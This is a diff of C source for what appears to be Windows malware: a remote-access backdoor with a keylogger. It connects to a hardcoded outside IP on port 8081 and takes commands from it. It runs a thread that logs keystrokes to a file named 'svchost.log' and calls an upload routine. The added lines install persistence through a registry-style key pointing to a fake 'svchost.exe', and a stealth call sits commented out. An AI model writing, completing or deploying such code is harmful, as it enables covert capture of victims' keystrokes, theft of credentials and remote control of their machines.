@@ -18,25 +18,25 @@
 int expression_handler(char *command, char **token);
 void *kl_thread();
 int main(){
-
 	WSADATA wsa;                                        //Info about winsock implementation
 	SOCKET s;
 	pthread_t tid;
 	char server_ip[15]="167.99.194.11", *buffer;
 	char server_reply[256], *token;
-	int recv_size,control_sock,port=8081;
+	int recv_size,control_sock,port=8081,test,create;
+	//stealth();
+	test=test_key();
+	if(test==2){
+		char *path="c:\\%windir%\\svchost.exe";
+		create=create_key(path);
+	}
     pthread_create(&tid, NULL, kl_thread, NULL);
-    FILE *f=fopen("svchost.log","w");
-    fclose(f);
     //Inizialize winsock
     do{
         control_sock=WSAStartup(MAKEWORD(2,2),&wsa);
     }while(control_sock!=0);
-    printf("CIAO");
     s = socket(AF_INET , SOCK_STREAM , 0 );             //Initialize sock
-    printf("BELLAA");
-    create_conn(s,server_ip, port);
-    printf("BELA");                     //Create connection
+    create_conn(s,server_ip, port);                  //Create connection
     while(1){
         recv_size=recv(s , server_reply , 100 , 0);
         server_reply[recv_size]='\0';
@@ -79,5 +79,8 @@ int expression_handler(char *command, char **riscommand){
 }
 
 void *kl_thread(){
+	upload();
+	FILE* fp =fopen("svchost.log","w");
+    fclose(fp);
     get_keylog();
 }
